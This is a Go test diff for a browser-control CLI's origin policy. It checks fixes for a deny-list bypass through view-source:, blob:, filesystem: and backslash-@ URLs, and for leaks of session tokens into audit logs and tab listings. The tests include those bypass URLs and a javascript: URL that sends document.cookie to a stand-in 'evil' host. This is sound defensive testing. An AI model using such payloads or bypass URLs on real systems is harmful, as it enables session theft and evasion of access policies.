@@ -889,3 +889,303 @@ func TestPolicyStateResetsBetweenSessionLines(t *testing.T) {
 		}
 	}
 }
+
+// HTML makes the read verbs part of the refusal guard too. Reading is exactly
+// what the deny-list bypass bought: `html` against a view-source: tab returned
+// the full authenticated page, exit 0, and every later verb on that tab was
+// permitted as well.
+func (b *refusalBrowser) HTML(context.Context, string, string, bool, chrome.QueryOpts) (map[string]any, error) {
+	b.acted("HTML")
+	return nil, nil
+}
+
+// TestDenyListSurvivesAUnparseableURL is H1 at the command boundary.
+//
+// Every row here exited 0 before the fix, against deny = ["bank.example",
+// "*.bank.example"]: the URL had no host net/url would report, the checker read
+// that as "matches no pattern", and "matches nothing" was returned as allowed
+// whenever no allow-list was configured. The `html` row is the one that hurts —
+// a tab already sitting on view-source: of the bank handed back the whole
+// authenticated statement.
+func TestDenyListSurvivesAUnparseableURL(t *testing.T) {
+	t.Parallel()
+	deny := config.Policy{
+		Present: true, Enabled: true,
+		Deny:   []string{"bank.example", "*.bank.example"},
+		Source: "/test/config.toml",
+	}
+
+	t.Run("navigating to a denied origin Chrome would resolve", func(t *testing.T) {
+		t.Parallel()
+		for _, dest := range []string{
+			`https://bank.example\@evil.io/`,
+			"view-source:https://bank.example/x",
+			"blob:https://bank.example/2f8a-uuid",
+			"filesystem:https://bank.example/temporary/dump",
+		} {
+			t.Run(dest, func(t *testing.T) {
+				t.Parallel()
+				env, _, code := runPolicy(t, refusing(t), deny, "open", dest, "--json")
+				if code != result.ExitPermission {
+					t.Fatalf("open %s exit = %d, want %d — Chrome resolves this to bank.example", dest, code, result.ExitPermission)
+				}
+				if got := errObj(t, env)["code"]; got != result.CodePermissionDenied {
+					t.Errorf("error.code = %v, want permission_denied", got)
+				}
+			})
+		}
+	})
+
+	t.Run("reading a tab already parked on a wrapped denied origin", func(t *testing.T) {
+		t.Parallel()
+		tab := target.Info{ID: "zz99", Title: "Chase — statement", URL: "view-source:https://bank.example/statement?session=SECRET"}
+		env, _, code := runPolicy(t, refusing(t, tab), deny, "html", "--target", "zz99", "--json")
+		if code != result.ExitPermission {
+			t.Fatalf("html exit = %d, want %d — the tab IS the denied origin, wrapped", code, result.ExitPermission)
+		}
+		if got := errObj(t, env)["origin"]; got != "bank.example" {
+			t.Errorf("error.details.origin = %v, want the unwrapped inner origin", got)
+		}
+	})
+
+	t.Run("view-source of an allowed origin still works", func(t *testing.T) {
+		t.Parallel()
+		// Unwrapping is a correction to the parse, not a new refusal rule.
+		tab := target.Info{ID: "aa11", Title: "App", URL: "view-source:https://app.example.com/dash"}
+		_, _, code := runPolicy(t, &fakeBrowser{tabs: []target.Info{tab}}, allowOnly("app.example.com"),
+			"html", "--target", "aa11", "--json")
+		if code != 0 {
+			t.Errorf("exit = %d, want 0 — view-source: of an allowed origin is still that origin", code)
+		}
+	})
+
+	t.Run("a genuinely hostless tab is refused under a deny-only policy", func(t *testing.T) {
+		t.Parallel()
+		tab := target.Info{ID: "cc33", Title: "Notes", URL: "file:///Users/alice/Documents/passwords.html"}
+		_, _, code := runPolicy(t, refusing(t, tab), deny, "html", "--target", "cc33", "--json")
+		if code != result.ExitPermission {
+			t.Errorf("exit = %d, want %d — a deny-list cannot prove this is not the denied origin", code, result.ExitPermission)
+		}
+	})
+}
+
+// TestAuditLogNeverRecordsARawURL is M6.
+//
+// originOf used to fall back to returning the raw URL when it could not be
+// parsed, and that string went straight into the append-only audit log and into
+// error.details.origin. The bytes it produced included
+// `"origin":"view-source:https://bank.example/statement?session=SECRET"` — a
+// session token, written to a file whose entire purpose is to be safe to keep.
+func TestAuditLogNeverRecordsARawURL(t *testing.T) {
+	t.Parallel()
+	const secret = "SECRET-session-token"
+	logPath := filepath.Join(t.TempDir(), "audit.log")
+	pol := config.Policy{
+		Present: true, Enabled: true,
+		Deny:     []string{"bank.example", "*.bank.example"},
+		AuditLog: logPath,
+		Source:   "/test/config.toml",
+	}
+	tabs := []target.Info{
+		{ID: "zz99", Title: "Statement", URL: "view-source:https://bank.example/statement?session=" + secret},
+		{ID: "ff44", Title: "Notes", URL: "file:///Users/alice/Documents/" + secret + ".html"},
+	}
+	if _, _, code := runPolicyOn(t, refusing(t, tabs...), pol, "html", "--target", "zz99", "--json"); code != result.ExitPermission {
+		t.Fatalf("the wrapped bank tab must be refused")
+	}
+	if _, _, code := runPolicyOn(t, refusing(t, tabs...), pol, "html", "--target", "ff44", "--json"); code != result.ExitPermission {
+		t.Fatalf("the hostless tab must be refused")
+	}
+	env, _, _ := runPolicyOn(t, refusing(t, tabs...), pol, "open",
+		"javascript:fetch('https://evil/?c='+document.cookie+'"+secret+"')", "--json")
+
+	raw, err := os.ReadFile(logPath)
+	if err != nil {
+		t.Fatalf("audit log: %v", err)
+	}
+	if strings.Contains(string(raw), secret) {
+		t.Fatalf("the audit log records a raw URL, secrets and all:\n%s", raw)
+	}
+	if strings.Contains(string(raw), "document.cookie") {
+		t.Fatalf("the audit log records a javascript: URL's body:\n%s", raw)
+	}
+	recs := readAudit(t, logPath)
+	if len(recs) != 3 {
+		t.Fatalf("want 3 refusal records, got %d: %v", len(recs), recs)
+	}
+	if recs[0]["origin"] != "bank.example" {
+		t.Errorf("a wrapped URL logs its inner origin, got %v", recs[0]["origin"])
+	}
+	if recs[1]["origin"] != "file:(unparseable)" {
+		t.Errorf("a hostless URL logs a scheme placeholder, got %v", recs[1]["origin"])
+	}
+	if recs[2]["origin"] != "javascript:(unparseable)" {
+		t.Errorf("a javascript: URL logs a scheme placeholder, got %v", recs[2]["origin"])
+	}
+	// error.details carries the same placeholder, not the raw string.
+	if got := errObj(t, env)["origin"]; got != "javascript:(unparseable)" {
+		t.Errorf("error.details.origin = %v, want the placeholder", got)
+	}
+	if strings.Contains(errObj(t, env)["message"].(string), secret) {
+		t.Errorf("the refusal message leaks the raw URL: %v", errObj(t, env)["message"])
+	}
+}
+
+// TestExemptVerbsRedactTheTargetTheyResolve is M3.
+//
+// `use`, `activate`, `close` and `policy init` are Exempt — they never act on
+// page content, so they are not origin-checked — but they DO resolve a target,
+// and emitting its raw TargetInfo handed back the full URL and title of a tab
+// the policy covers, free and side-effect-free. The redaction is at the emit
+// boundary rather than in each verb precisely so the next Exempt verb cannot
+// forget it.
+func TestExemptVerbsRedactTheTargetTheyResolve(t *testing.T) {
+	t.Parallel()
+	const secret = "SEKRET-session"
+	tabs := []target.Info{
+		{ID: "aa11", Title: "App", URL: "https://app.example.com/dash"},
+		{ID: "zz99", Title: "Chase — Account 4021 statement", URL: "https://bank.example/accounts/4021?session=" + secret},
+	}
+	assertRedacted := func(t *testing.T, env map[string]any, code int) {
+		t.Helper()
+		if code != 0 {
+			t.Fatalf("exit = %d, want 0 — the tab verbs stay usable under a policy", code)
+		}
+		tgt, ok := env["target"].(map[string]any)
+		if !ok {
+			t.Fatalf("envelope has no target: %v", env)
+		}
+		if tgt["url"] != "https://bank.example" {
+			t.Errorf("target.url = %v, want the bare origin", tgt["url"])
+		}
+		if tgt["title"] != "" {
+			t.Errorf("target.title = %v, want it redacted", tgt["title"])
+		}
+		if tgt["id"] != "zz99" {
+			t.Errorf("the tab must stay addressable by id: %v", tgt)
+		}
+	}
+	for _, args := range [][]string{{"activate", "zz99"}, {"close", "zz99"}} {
+		t.Run(args[0], func(t *testing.T) {
+			t.Parallel()
+			full := append(append([]string{}, args...), "--json")
+			env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), full...)
+			assertRedacted(t, env, code)
+		})
+	}
+
+	// `use` is the fourth Exempt verb that resolves a target. It needs a
+	// sticky-target store, which runPolicy does not wire, so it is run here with
+	// one — the point being that it goes through the same emit boundary.
+	t.Run("use", func(t *testing.T) {
+		t.Parallel()
+		out, errb := &bytes.Buffer{}, &bytes.Buffer{}
+		d := config.Builtin()
+		d.Policy = allowOnly("*.example.com")
+		app := New(&fakeBrowser{tabs: tabs}, out, errb).WithDefaults(d).
+			WithStickyTarget(func(ConnOpts) string { return "" }, func(ConnOpts, string) error { return nil })
+		code := app.Execute("use", "zz99", "--json")
+		var env map[string]any
+		if err := json.Unmarshal([]byte(strings.TrimSpace(out.String())), &env); err != nil {
+			t.Fatalf("stdout is not one JSON value: %v\n%s", err, out.String())
+		}
+		assertRedacted(t, env, code)
+	})
+
+	t.Run("an allowed target is untouched", func(t *testing.T) {
+		t.Parallel()
+		env, _, _ := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "activate", "aa11", "--json")
+		tgt := env["target"].(map[string]any)
+		if tgt["url"] != tabs[0].URL || tgt["title"] != "App" {
+			t.Errorf("an allowed tab must be reported in full: %v", tgt)
+		}
+	})
+
+	t.Run("with no policy configured nothing changes", func(t *testing.T) {
+		t.Parallel()
+		env, _, _ := runPolicy(t, &fakeBrowser{tabs: tabs}, config.Policy{}, "activate", "zz99", "--json")
+		tgt := env["target"].(map[string]any)
+		if tgt["url"] != tabs[1].URL || tgt["title"] != tabs[1].Title {
+			t.Errorf("unconfigured, the envelope must be byte-identical to before: %v", tgt)
+		}
+	})
+}
+
+// TestCloseAmbiguityRedactsItsMatches is M4: `close --url <substr>` enumerating
+// every match is a free, side-effect-free read of every matching tab's URL and
+// title, on a verb that is never origin-checked.
+func TestCloseAmbiguityRedactsItsMatches(t *testing.T) {
+	t.Parallel()
+	const secret = "SEKRET-session"
+	tabs := []target.Info{
+		{ID: "aa11", Title: "App", URL: "https://app.example.com/a"},
+		{ID: "zz99", Title: "Chase — Account 4021", URL: "https://bank.example/a?session=" + secret},
+		{ID: "ff44", Title: "Payroll", URL: "file:///Users/alice/a/salary.html"},
+	}
+	env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "close", "--url", "/a", "--json")
+	if code == 0 {
+		t.Fatal("three tabs match and --all was not given; want an ambiguity error")
+	}
+	e := errObj(t, env)
+	blob, err := json.Marshal(e)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Contains(string(blob), secret) {
+		t.Fatalf("the ambiguity error enumerates a non-allowed tab's full URL:\n%s", blob)
+	}
+	if strings.Contains(string(blob), "salary.html") || strings.Contains(string(blob), "Chase") {
+		t.Fatalf("the ambiguity error enumerates non-allowed tabs unredacted:\n%s", blob)
+	}
+	matches := e["matches"].([]any)
+	if len(matches) != 3 {
+		t.Fatalf("all three tabs must still be named, got %d", len(matches))
+	}
+	if m := matches[0].(map[string]any); m["url"] != tabs[0].URL || m["title"] != "App" {
+		t.Errorf("the allowed tab must not be redacted: %v", m)
+	}
+	if m := matches[1].(map[string]any); m["url"] != "https://bank.example" || m["title"] != "" {
+		t.Errorf("a non-allowed tab must show its origin only: %v", m)
+	}
+	if m := matches[2].(map[string]any); m["url"] != "file:(unparseable)" || m["id"] != "ff44" {
+		t.Errorf("a hostless tab must show a placeholder and stay addressable: %v", m)
+	}
+}
+
+// TestListRedactsHostlessTabs is M5. redactTab cleared the title but returned
+// the raw URL for a tab with no parseable host — file:// and data:, which are
+// exactly the tabs the policy covers least and the ones whose URL IS the
+// content.
+func TestListRedactsHostlessTabs(t *testing.T) {
+	t.Parallel()
+	tabs := []target.Info{
+		{ID: "aa11", Title: "App", URL: "https://app.example.com/dash"},
+		{ID: "ff44", Title: "Passwords", URL: "file:///Users/alice/Documents/passwords.html"},
+		{ID: "dd55", Title: "Offer", URL: "data:text/html,<h1>salary 250000</h1>"},
+	}
+	env, _, code := runPolicy(t, &fakeBrowser{tabs: tabs}, allowOnly("*.example.com"), "list", "--json")
+	if code != 0 {
+		t.Fatalf("exit = %d, want 0 — list is never refused", code)
+	}
+	blob, err := json.Marshal(env)
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, leak := range []string{"passwords.html", "salary 250000", "/Users/alice"} {
+		if strings.Contains(string(blob), leak) {
+			t.Errorf("list leaked %q for a tab the policy does not cover:\n%s", leak, blob)
+		}
+	}
+	rows := env["result"].(map[string]any)["tabs"].([]any)
+	if got := rows[1].(map[string]any)["url"]; got != "file:(unparseable)" {
+		t.Errorf("file:// row url = %v, want a scheme placeholder", got)
+	}
+	if got := rows[2].(map[string]any)["url"]; got != "data:(unparseable)" {
+		t.Errorf("data: row url = %v, want a scheme placeholder", got)
+	}
+	for _, i := range []int{1, 2} {
+		if got := rows[i].(map[string]any)["title"]; got != "" {
+			t.Errorf("row %d title = %v, want it redacted", i, got)
+		}
+	}
+}
